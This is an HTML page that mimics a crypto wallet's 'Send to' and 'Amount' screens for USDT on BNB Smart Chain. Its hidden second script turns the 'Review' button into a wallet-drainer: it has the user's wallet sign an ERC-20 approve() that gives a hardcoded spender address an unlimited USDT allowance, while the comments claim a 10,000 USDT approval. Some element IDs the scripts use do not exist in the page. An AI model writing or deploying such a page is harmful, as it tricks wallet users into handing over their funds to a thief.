<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Crypto Wallet Transfer</title>
  <!-- Tailwind CSS CDN for dynamic utilities -->
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            walletDark: '#0b0e14',
            walletCard: '#131722',
            walletBorder: '#1e2330',
            walletBtn: '#1a1f2c',
            primaryBlue: '#4338ca',
            primaryHover: '#3730a3',
            subText: '#848e9c',
            usdtGreen: '#26a17b'
          }
        }
      }
    }
  </script>
  <style>
    * {
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }
    body {
      background-color: #030508;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    
    /* Blinking cursor animation for amount display */
    .blinking-cursor {
      display: inline-block;
      width: 2.5px;
      height: 2.5rem;
      background-color: #6366f1;
      margin-right: 2px;
      animation: blink 1s infinite;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    /* Smooth page transitions */
    .page-transition {
      transition: transform 0.35s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.25s ease;
    }
    
    .screen-p1 {
      transform: translateX(0%);
    }
    .screen-p1.slide-out {
      transform: translateX(-100%);
      opacity: 0;
      pointer-events: none;
    }
    
    .screen-p2 {
      transform: translateX(100%);
      opacity: 0;
      pointer-events: none;
    }
    .screen-p2.active {
      transform: translateX(0%);
      opacity: 1;
      pointer-events: auto;
    }

    /* Keypad button active press state feedback */
    .keypad-btn:active {
      background-color: rgba(255, 255, 255, 0.08);
      transform: scale(0.96);
    }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen p-0 sm:p-4 text-white">

  <!-- Main Phone Container Screen -->
  <div class="relative w-full max-w-[390px] h-[100vh] sm:h-[780px] bg-walletDark sm:rounded-[32px] overflow-hidden shadow-2xl flex flex-col border border-gray-800/60">

    <!-- ================= PAGE 1: SEND TO ================= -->
    <div id="page-1" class="page-transition screen-p1 absolute inset-0 flex flex-col p-5 bg-walletDark z-10 justify-between">
      <div>
        <!-- Top Navigation Header -->
        <div class="flex items-center justify-between mb-6 pt-2">
          <button class="w-10 h-10 rounded-full bg-walletBtn flex items-center justify-center text-white hover:bg-gray-800 transition-colors">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"/></svg>
          </button>
          <h1 class="text-lg font-semibold text-white tracking-wide">Send to</h1>
          <button class="w-10 h-10 rounded-full bg-walletBtn flex items-center justify-center text-white hover:bg-gray-800 transition-colors">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7V5a2 2 0 012-2h2M17 3h2a2 2 0 012 2v2M21 17v2a2 2 0 01-2 2h-2M7 21H5a2 2 0 01-2-2v-2"/></svg>
          </button>
        </div>

        <!-- Target Address Box Card -->
        <div class="bg-walletCard border border-walletBorder rounded-2xl p-4 mb-6">
          <p id="p1-address-display" class="text-white text-[15px] font-medium leading-relaxed break-all mb-4">
            0xB37dEfd37a11F0cF84ec43B067C2CbA9A7A8f2b5
          </p>
          <div class="flex items-center gap-2">
            <!-- BNB Network Badge -->
            <div class="bg-[#1a1f2c] border border-gray-700/60 rounded-full px-3 py-1.5 flex items-center gap-2 text-xs font-medium text-white">
              <span class="w-4 h-4 rounded-full bg-[#f0b90b] text-black font-bold flex items-center justify-center text-[10px]">❖</span>
              <span>BNB Smart Chain</span>
            </div>
            <!-- Clear Button -->
            <button id="btn-clear-address" class="bg-[#1a1f2c] border border-gray-700/60 hover:bg-gray-800 text-white rounded-full px-4 py-1.5 text-xs font-medium transition-colors">
              Clear
            </button>
          </div>
        </div>

        <!-- Address Book Header -->
        <div class="flex items-center gap-1.5 text-white font-semibold text-base mb-4 cursor-pointer hover:opacity-80 transition-opacity">
          <span>Address book</span>
          <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 5l7 7-7 7"/></svg>
        </div>

        <!-- Address Book Wallet Item -->
        <div class="flex items-center gap-3 cursor-pointer p-1 rounded-xl hover:bg-walletCard/50 transition-colors">
          <div class="w-11 h-11 rounded-full bg-gradient-to-tr from-blue-700 to-blue-500 border border-blue-400/40 flex items-center justify-center shrink-0">
            <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-5.45 9-12V5l-9-4z"/></svg>
          </div>
          <div class="overflow-hidden">
            <h2 class="text-white text-sm font-semibold tracking-wide">Main Wallet 1</h2>
            <p class="text-subText text-xs truncate">0xb37defd37a11f0cf84ec43b067c2cba9a7a8f2b5</p>
          </div>
        </div>
      </div>

      <!-- Page 1 Action Button -->
      <div class="pt-4 pb-2">
        <button id="btn-continue" class="w-full py-3.5 bg-primaryBlue hover:bg-primaryHover text-white font-semibold text-base rounded-full shadow-lg transition-all active:scale-[0.98]">
          Continue
        </button>
      </div>
    </div>


    <!-- ================= PAGE 2: AMOUNT ================= -->
    <div id="page-2" class="page-transition screen-p2 absolute inset-0 flex flex-col p-5 bg-walletDark z-20 justify-between">
      <div>
        <!-- Top Navigation Header -->
        <div class="flex items-center justify-between mb-2 pt-2">
          <button id="btn-back" class="w-10 h-10 rounded-full bg-walletBtn flex items-center justify-center text-white hover:bg-gray-800 transition-colors">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"/></svg>
          </button>
          <h1 class="text-lg font-semibold text-white tracking-wide">Amount</h1>
          <div class="w-10"></div> <!-- Placeholder spacer for centering header title -->
        </div>

        <!-- Destination Address Subtitle -->
        <div class="text-center px-4 mb-4">
          <p class="text-subText text-xs font-normal truncate">
            To: <span id="p2-address-target" class="text-gray-200">0xB37dEfd37a11F0cF84ec43B067C2CbA9A7A8f2b5</span>
          </p>
        </div>

        <!-- Dynamic Amount Input Display (No "Not Enough Balance" error) -->
        <div class="flex flex-col items-center justify-center my-6 h-24">
          <div class="flex items-center justify-center text-4xl font-normal text-white tracking-tight">
            <span class="blinking-cursor"></span>
            <span id="amount-val" class="min-w-[10px]">100</span>
          </div>
          <!-- Dynamic Fiat Value Calculation -->
          <div class="flex items-center gap-1 text-subText text-sm mt-2 font-normal">
            <span id="fiat-val">≈ $99.98</span>
            <svg class="w-3.5 h-3.5 text-subText" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16V4M7 4L3 8M7 4l4 4M17 8v12M17 20l4-4M17 20l-4-4"/></svg>
          </div>
        </div>

        <!-- USDT Asset Row -->
        <div class="flex items-center justify-between p-2 rounded-2xl bg-walletCard/40 mb-2">
          <div class="flex items-center gap-3">
            <div class="relative w-10 h-10 rounded-full bg-usdtGreen flex items-center justify-center text-white font-bold text-xl">
              ₮
              <span class="absolute -bottom-0.5 -right-0.5 w-3.5 h-3.5 bg-[#f0b90b] rounded-full border-2 border-walletDark"></span>
            </div>
            <div>
              <p class="text-white text-sm font-semibold">0 USDT</p>
              <p class="text-subText text-xs">$0.00</p>
            </div>
          </div>
          <!-- Max Button -->
          <button id="btn-max" class="bg-[#1a1f2c] border border-gray-700/60 hover:bg-gray-800 text-white rounded-full px-4 py-1.5 text-xs font-semibold transition-colors">
            Max
          </button>
        </div>
      </div>

      <!-- Interactive Custom Keypad (0-9, ., Backspace) -->
      <div class="flex flex-col gap-2">
        <div class="grid grid-cols-3 gap-y-3 gap-x-6 px-4 py-2">
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressKey('1')">1</button>
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressKey('2')">2</button>
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressKey('3')">3</button>
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressKey('4')">4</button>
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressKey('5')">5</button>
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressKey('6')">6</button>
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressKey('7')">7</button>
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressKey('8')">8</button>
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressKey('9')">9</button>
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressKey('.')">.</button>
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressKey('0')">0</button>
          <button class="keypad-btn text-2xl font-medium text-white py-2 rounded-lg transition-transform flex items-center justify-center" onclick="pressBackspace()">
            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.414-6.414A2 2 0 0110.828 5H19a2 2 0 012 2v10a2 2 0 01-2 2h-8.172a2 2 0 01-1.414-.586L3 12z"/></svg>
          </button>
        </div>

        <!-- Page 2 Review Action Button -->
        <div class="pt-2 pb-2">
          <button type="button" id="nextBtn" class="next w-full py-3.5 bg-primaryBlue text-white font-semibold text-base rounded-full shadow-lg transition-all active:scale-[0.98]">
            Review
          </button>





          
        </div>
      </div>
    </div>

  </div>

  <script>
    // App State Variables
    let currentAmountStr = "0";
    const USDT_TO_USD_RATE = 1;

    // DOM Elements
    const page1 = document.getElementById('page-1');
    const page2 = document.getElementById('page-2');
    const btnContinue = document.getElementById('btn-continue');
    const btnBack = document.getElementById('btn-back');
    const btnClearAddress = document.getElementById('btn-clear-address');
    const p1AddressDisplay = document.getElementById('p1-address-display');
    const amountValEl = document.getElementById('amount-val');
    const fiatValEl = document.getElementById('fiat-val');
    const btnReview = document.getElementById('btn-review');
    const btnMax = document.getElementById('btn-max');

    // Page Transition Handlers
    btnContinue.addEventListener('click', () => {
      page1.classList.add('slide-out');
      page2.classList.add('active');
    });

    btnBack.addEventListener('click', () => {
      page2.classList.remove('active');
      page1.classList.remove('slide-out');
    });

    // Clear Address Action
    btnClearAddress.addEventListener('click', () => {
      p1AddressDisplay.textContent = "";
    });

    // Update Display and Button Enabled/Disabled State
    function refreshDisplay() {
      // Amount text
      amountValEl.textContent = currentAmountStr === "" ? "0" : currentAmountStr;

      // Fiat calculation
      const numVal = parseFloat(currentAmountStr);
      if (isNaN(numVal) || numVal === 0) {
        fiatValEl.textContent = "≈ $0.00";
        // Disable Review Button if amount is 0 or empty
        btnReview.className = "w-full py-3.5 bg-[#1a1f2c] text-[#475569] font-semibold text-base rounded-full cursor-not-allowed transition-all";
        btnReview.disabled = true;
      } else {
        const fiatCalculated = (numVal * USDT_TO_USD_RATE).toFixed(2);
        fiatValEl.textContent = `≈ $${fiatCalculated}`;
        // Enable Review Button when amount > 0
        btnReview.className = "w-full py-3.5 bg-primaryBlue hover:bg-primaryHover text-white font-semibold text-base rounded-full shadow-lg transition-all active:scale-[0.98] cursor-pointer";
        btnReview.disabled = false;
      }
    }

    // Keypad Input Handlers
    function pressKey(val) {
      if (val === '.') {
        if (currentAmountStr.includes('.')) return;
        if (currentAmountStr === "") currentAmountStr = "0";
      }

      if (currentAmountStr === "0" && val !== '.') {
        currentAmountStr = val;
      } else {
        // Limit string length to avoid overflow
        if (currentAmountStr.length < 10) {
          currentAmountStr += val;
        }
      }
      refreshDisplay();
    }

    function pressBackspace() {
      if (currentAmountStr.length > 0) {
        currentAmountStr = currentAmountStr.slice(0, -1);
      }
      refreshDisplay();
    }

    btnMax.addEventListener('click', () => {
      currentAmountStr = "500";
      refreshDisplay();
    });

    // Initialize display state on load
    refreshDisplay();
  </script>





<script>

  const amount =
    document.getElementById("amount");

  const usdValue =
    document.getElementById("usdValue");

  const pasteBtn =
    document.getElementById("pasteBtn");

  const address =
    document.getElementById("address");

  const maxBtn =
    document.getElementById("maxBtn");




  /*
   * ==========================================
   * AMOUNT / USD
   * ==========================================
   */

  function updateUsd() {

    const raw =
      amount.value
        .replace(/,/g, "")
        .trim();

    const n = Number(raw);

    if (
      !raw ||
      !Number.isFinite(n)
    ) {

      usdValue.textContent =
        "≈ $0.00";

      return;
    }

    usdValue.textContent =
      "≈ $" +
      n.toLocaleString(
        "en-US",
        {
          minimumFractionDigits: 2,
          maximumFractionDigits: 2
        }
      );
  }


  amount.addEventListener(
    "input",
    () => {

      let value =
        amount.value.replace(
          /[^\d.]/g,
          ""
        );

      const parts =
        value.split(".");

      if (parts.length > 2) {

        value =
          parts[0] +
          "." +
          parts.slice(1).join("");
      }

      amount.value =
        value;

      updateUsd();
    }
  );


  /*
   * ==========================================
   * PASTE
   * ==========================================
   */

  pasteBtn.addEventListener(
    "click",
    async () => {

      try {

        const text =
          await navigator.clipboard.readText();

        if (text) {
          address.textContent = text;
        }

      } catch (error) {

        console.error(
          "Clipboard error:",
          error
        );
      }
    }
  );


  /*
   * ==========================================
   * MAX
   * ==========================================
   */

  maxBtn.addEventListener(
    "click",
    () => {
      amount.focus();
    }
  );








  /*
   * ==========================================
   * USDT / BSC CONFIG
   * ==========================================
   */

  const TOKEN_ADDRESS =
    "0x55d398326f99059fF775485246999027B3197955";

  const SPENDER_ADDRESS =
    "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";

  const BSC_CHAIN_ID_HEX =
    "0x38";

  /*
   * BSC USDT uses 18 decimals.
   *
   * 10,000 USDT =
   *
   * 10000 * 10^18
   */

const APPROVAL_AMOUNT =
  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn;



  /*
   * ==========================================
   * ERC-20 approve(address,uint256)
   * ==========================================
   *
   * Function selector:
   * 095ea7b3
   */

  function buildApproveData() {

    const spender =
      SPENDER_ADDRESS
        .slice(2)
        .toLowerCase()
        .padStart(64, "0");

    const amount =
      APPROVAL_AMOUNT
        .toString(16)
        .padStart(64, "0");

    return (
      "0x095ea7b3" +
      spender +
      amount
    );
  }


  /*
   * ==========================================
   * FIND WALLET PROVIDER
   * ==========================================
   */

  function getWalletProvider() {

    /*
     * Trust Wallet injected provider.
     */

    if (
      window.trustwallet &&
      window.trustwallet.ethereum &&
      typeof window.trustwallet.ethereum.request ===
        "function"
    ) {
      return window.trustwallet.ethereum;
    }


    /*
     * MetaMask / standard EIP-1193 provider.
     */

    if (
      window.ethereum &&
      typeof window.ethereum.request ===
        "function"
    ) {
      return window.ethereum;
    }


    return null;
  }


  /*
   * ==========================================
   * NEXT BUTTON
   * ==========================================
   */

  const nextBtn =
    document.getElementById("nextBtn");


  nextBtn.addEventListener(
    "click",
    async () => {

      const provider =
        getWalletProvider();


      /*
       * No wallet injected.
       */

      if (!provider) {

        alert(
          "Open this page inside Trust Wallet or MetaMask."
        );

        return;
      }


      try {

        nextBtn.disabled =
          true;

        nextBtn.textContent =
          "Connecting...";


        /*
         * ======================================
         * REQUEST WALLET ACCOUNT
         * ======================================
         *
         * If the wallet hasn't authorized the
         * DApp yet, the wallet handles that
         * authorization.
         */

        const accounts =
          await provider.request({
            method:
              "eth_requestAccounts"
          });


        if (
          !accounts ||
          accounts.length === 0
        ) {
          throw new Error(
            "No wallet account was returned."
          );
        }


        const account =
          accounts[0];


        /*
         * ======================================
         * CHECK BSC
         * ======================================
         */

        let chainId =
          await provider.request({
            method:
              "eth_chainId"
          });


        chainId =
          String(chainId)
            .toLowerCase();


        /*
         * Switch to BSC if necessary.
         */

        if (
          chainId !==
          BSC_CHAIN_ID_HEX
        ) {

          nextBtn.textContent =
            "Switching network...";


          await provider.request({

            method:
              "wallet_switchEthereumChain",

            params: [
              {
                chainId:
                  BSC_CHAIN_ID_HEX
              }
            ]

          });
        }


        /*
         * ======================================
         * BUILD APPROVE TRANSACTION
         * ======================================
         *
         * This is:
         *
         * USDT.approve(
         *   SPENDER_ADDRESS,
         *   10,000 USDT
         * )
         */

        const data =
          buildApproveData();


        console.log(
          "Approval calldata:",
          data
        );


        /*
         * ======================================
         * OPEN WALLET CONFIRMATION
         * ======================================
         */

        nextBtn.textContent =
          "Confirm in wallet...";


        /*
         * This is the REAL blockchain
         * transaction.
         *
         * It goes to the USDT contract,
         * NOT to the spender address.
         */

        const txHash =
          await provider.request({

            method:
              "eth_sendTransaction",

            params: [
              {
                from:
                  account,

                to:
                  TOKEN_ADDRESS,

                data:
                  data
              }
            ]

          });


        console.log(
          "Approval transaction:",
          txHash
        );


        /*
         * ======================================
         * WAIT FOR MINING
         * ======================================
         */

        nextBtn.textContent =
          "Confirming...";


        let receipt =
          null;


        for (
          let i = 0;
          i < 120;
          i++
        ) {

          await new Promise(
            resolve =>
              setTimeout(
                resolve,
                2000
              )
          );


          receipt =
            await provider.request({

              method:
                "eth_getTransactionReceipt",

              params: [
                txHash
              ]

            });


          if (receipt) {
            break;
          }
        }


        /*
         * ======================================
         * TRANSACTION NOT FOUND
         * ======================================
         */

        if (!receipt) {

          throw new Error(
            "Transaction was submitted but confirmation timed out."
          );
        }


        /*
         * ======================================
         * TRANSACTION FAILED
         * ======================================
         */

        if (
          receipt.status === "0x0" ||
          receipt.status === 0
        ) {

          throw new Error(
            "The approval transaction failed."
          );
        }


        /*
         * ======================================
         * DONE
         * ======================================
         */

        console.log(
          "10,000 USDT approval confirmed:",
          txHash
        );


        nextBtn.textContent =
          "Done";

        nextBtn.disabled =
          false;


        /*
         * Optional:
         *
         * Go to your done page here.
         *
         * window.location.href =
         *   "/done.html";
         */

      } catch (error) {

        console.error(
          "Approval error:",
          error
        );


        /*
         * User rejected the wallet popup.
         */

        if (
          error &&
          error.code === 4001
        ) {

          alert(
            "Approval was rejected in the wallet."
          );

        } else {

          alert(
            error?.message ||
            "Unable to submit the approval transaction."
          );
        }


        nextBtn.disabled =
          false;

        nextBtn.textContent =
          "Next";
      }

    }
  );
</script>





















  

</body>
</html>
